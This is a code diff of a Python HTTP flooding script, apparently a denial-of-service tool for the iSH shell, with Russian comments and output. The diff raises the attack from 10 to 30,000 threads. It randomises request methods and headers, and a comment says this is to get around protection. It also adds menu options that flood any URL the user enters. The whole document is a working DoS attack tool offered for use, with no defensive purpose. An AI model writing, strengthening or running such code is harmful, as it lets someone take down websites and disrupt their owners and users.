@@ -28,52 +28,47 @@ def get_target():
     return target
 
 def dos_attack(target):
-    """Простая DOS атака (один поток)"""
+    """Мощная DOS атака (1000 потоков)"""
     global attack_running
-    print(f"[DOS] Начинаем атаку на {target}")
-    
-    try:
-        while attack_running:
-            try:
-                headers = {'User-Agent': random.choice(user_agents)}
-                response = requests.get(target, headers=headers, timeout=5)
-                print(f"[DOS] Отправлен запрос - Status: {response.status_code}")
-            except Exception as e:
-                print(f"[DOS] Ошибка: {str(e)}")
-            
-            time.sleep(0.1)  # 10 запросов в секунду
-            
-    except KeyboardInterrupt:
-        print("[DOS] Атака остановлена")
-
-def ddos_worker(target, worker_id):
-    """Рабочий поток для DDOS атаки"""
-    global attack_running
-    print(f"[DDOS-W{worker_id}] Поток запущен")
-    
-    while attack_running:
-        try:
-            headers = {'User-Agent': random.choice(user_agents)}
-            response = requests.get(target, headers=headers, timeout=3)
-            print(f"[DDOS-W{worker_id}] Запрос отправлен - Status: {response.status_code}")
-        except Exception as e:
-            print(f"[DDOS-W{worker_id}] Ошибка: {str(e)}")
-        
-        time.sleep(0.05)  # 20 запросов в секунду на поток
-
-def ddos_attack(target):
-    """Многопоточная DDOS атака"""
-    global attack_running, threads
-    
-    print(f"[DDOS] Начинаем атаку на {target}")
-    print("[DDOS] Запускаем 10 потоков...")
+    print(f"[DOS] Запускаем МОЩНУЮ атаку на {target}")
+    print(f"[DOS] Количество потоков: 1000")
+    print(f"[DOS] Ожидаемая нагрузка: ~50,000 запросов/секунду")
     
     attack_running = True
     threads = []
     
-    # Запускаем 10 рабочих потоков
-    for i in range(10):
-        thread = threading.Thread(target=ddos_worker, args=(target, i+1))
+    def dos_worker(worker_id):
+        while attack_running:
+            try:
+                headers = {
+                    'User-Agent': random.choice(user_agents),
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Connection': 'keep-alive',
+                    'Cache-Control': 'no-cache'
+                }
+                
+                # Разные типы запросов для обхода защиты
+                methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
+                method = random.choice(methods)
+                
+                if method == 'POST':
+                    response = requests.post(target, headers=headers, timeout=3, 
+                                           data={'random': random.randint(1, 1000)})
+                else:
+                    response = requests.request(method, target, headers=headers, timeout=3)
+                    
+                print(f"[DOS-W{worker_id:04d}] {method} запрос - Status: {response.status_code}")
+                
+            except Exception as e:
+                print(f"[DOS-W{worker_id:04d}] Ошибка: {str(e)}")
+            
+            time.sleep(0.01)  # 100 запросов в секунду на поток
+    
+    # Запускаем 1000 потоков для DOS атаки
+    for i in range(1000):
+        thread = threading.Thread(target=dos_worker, args=(i+1,))
         thread.daemon = True
         threads.append(thread)
         thread.start()
@@ -82,27 +77,90 @@ def ddos_attack(target):
         while attack_running:
             time.sleep(1)
     except KeyboardInterrupt:
-        print("[DDOS] Останавливаем атаку...")
+        print("[DOS] Останавливаем атаку...")
         attack_running = False
         for thread in threads:
             thread.join()
-        print("[DDOS] Атака остановлена")
+        print("[DOS] Атака остановлена")
+
+def ddos_attack(target):
+    """МЕГА DDOS атака (30,000 потоков)"""
+    global attack_running
+    print(f"[DDOS] Запускаем МЕГА атаку на {target}")
+    print(f"[DDOS] Количество потоков: 30,000")
+    print(f"[DDOS] Ожидаемая нагрузка: ~1,500,000 запросов/секунду")
+    print(f"[DDOS] ⚠️ ЭКСТРЕМАЛЬНАЯ НАГРУЗКА! ⚠️")
+    
+    attack_running = True
+    threads = []
+    
+    def ddos_worker(worker_id):
+        while attack_running:
+            try:
+                headers = {
+                    'User-Agent': random.choice(user_agents),
+                    'Accept': '*/*',
+                    'Connection': 'close',
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache'
+                }
+                
+                # Быстрые простые запросы
+                response = requests.get(target, headers=headers, timeout=2)
+                print(f"[DDOS-W{worker_id:05d}] Запрос - Status: {response.status_code}")
+                
+            except Exception as e:
+                # В DDOS режиме не выводим ошибки для скорости
+                pass
+            
+            time.sleep(0.001)  # 1000 запросов в секунду на поток
+    
+    # Запускаем 30,000 потоков для DDOS атаки
+    for i in range(30000):
+        try:
+            thread = threading.Thread(target=ddos_worker, args=(i+1,))
+            thread.daemon = True
+            threads.append(thread)
+            thread.start()
+            
+            if i % 1000 == 0:
+                print(f"[DDOS] Запущено потоков: {i+1}/30000")
+                
+        except Exception as e:
+            print(f"[DDOS] Ошибка создания потока {i+1}: {str(e)}")
+            break
+    
+    print("[DDOS] Все потоки запущены! Атака началась!")
+    
+    try:
+        while attack_running:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("[DDOS] Останавливаем МЕГА атаку...")
+        attack_running = False
+        print("[DDOS] Ожидаем завершения потоков...")
+        for thread in threads:
+            thread.join()
+        print("[DDOS] МЕГА атака остановлена")
 
 def stop_attack():
     """Остановка всех атак"""
     global attack_running, threads
     attack_running = False
+    print("🛑 Останавливаем все потоки...")
     for thread in threads:
         thread.join()
     threads = []
     print("✅ Все атаки остановлены")
 
 def show_banner():
-    print("🛡️" * 20)
-    print("          DOCTOR DDoS TOOL")
-    print("           for iSH on GitHub")
-    print("🛡️" * 20)
-    print()
+    print("⚡" * 40)
+    print("           MEGA DDOS TOOL v2.0")
+    print("         ULTRA POWERFUL EDITION")
+    print("⚡" * 40)
+    print("🚀 DOS: 1000 потоков (~50K RPS)")
+    print("💥 DDOS: 30,000 потоков (~1.5M RPS)")
+    print("⚡" * 40)
 
 def main():
     global attack_running
@@ -110,22 +168,27 @@ def main():
     show_banner()
     
     while True:
-        print("\n🔧 Выберите действие:")
-        print("[1] DOS-атака (1 поток)")
-        print("[2] DDOS-атака (10 потоков)")
-        print("[3] Остановить все атаки")
-        print("[4] Выход")
+        print("\n🔧 Выберите тип МОЩНОЙ атаки:")
+        print("[1] 💣 MEGA DOS атака (1000 потоков)")
+        print("[2] ☢️  ULTRA DDOS атака (30,000 потоков)")
+        print("[3] ⛔ Остановить все атаки")
+        print("[4] 🚪 Выход")
         
         choice = input("Выбор: ").strip()
         
         if choice == "1":
             target = get_target()
-            attack_running = True
             dos_attack(target)
             
         elif choice == "2":
             target = get_target()
-            ddos_attack(target)
+            print("⚠️  ПРЕДУПРЕЖДЕНИЕ: 30,000 потоков могут вызвать:")
+            print("   - Высокую нагрузку на устройство")
+            print("   - Зависание системы")
+            print("   - Перегрев устройства")
+            confirm = input("Продолжить? (y/N): ").strip().lower()
+            if confirm == 'y':
+                ddos_attack(target)
             
         elif choice == "3":
             stop_attack()
@@ -139,7 +202,6 @@ def main():
             print("❌ Неверный выбор!")
 
 if __name__ == "__main__":
-    # Установка зависимостей в iSH
     print("📦 Проверка зависимостей...")
     try:
         import requests
